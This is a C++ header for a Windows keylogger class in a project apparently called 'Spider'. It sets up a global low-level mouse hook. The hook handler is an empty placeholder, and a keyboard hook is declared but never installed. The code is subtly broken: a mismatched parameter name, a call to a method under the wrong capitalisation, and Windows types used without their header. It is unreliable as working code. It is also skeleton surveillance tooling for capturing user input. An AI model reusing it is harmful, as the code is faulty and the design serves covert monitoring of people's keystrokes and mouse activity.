//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_WINKEYLOGGER_HPP
#define SPIDER_CLIENT_WINKEYLOGGER_HPP

#include <memory>
#include <utils/Config.hpp>
#include "LazySingleton.hpp"
#include "KeyLogger.hpp"

namespace spi
{
    class WinKeyLogger : public KeyLogger, public utils::LazySingleton<WinKeyLogger>
    {
    public:
        explicit WinKeyLogger(LogHandle &logHandle) : _logHandle(logHandle)
        {
        };
        virtual ~WinKeyLogger() = default;

    public:
        void setup() override
        {
            WinKeyLogger::getInstance(_logHandle);
            WinKeyLogger::getInstance().setupHooks();
        }

        static LRESULT CALLBACK MouseHookProc(int code, WPARAM wParam, LPARAM lParam)
        {
            WinKeyLogger::getInstance().mouseHook(nCode, wParam, lParam);
            return CallNextHookEx(0, nCode, wParam, lParam);
        };

        void MouseHook(int nCode, WPARAM wParam, LPARAM lParam)
        {
            // your hook code here
        };

        void setupHooks()
        {
            _mouseHook = SetWindowsHookEx(WH_MOUSE_LL, &MouseHookProc, NULL, 0);
        }

    private:
        HHOOK _keyboardHook;
        HHOOK _mouseHook;
        LogHandle &_logHandle;
    };
}

namespace spi::details
{
    static always_inline KeyLogPtr createKeyLogger(LogHandle &logHandle)
    {
        return std::make_unique<WinKeyLogger>(logHandle);
    }
}

#endif //SPIDER_CLIENT_WINKEYLOGGER_HPP
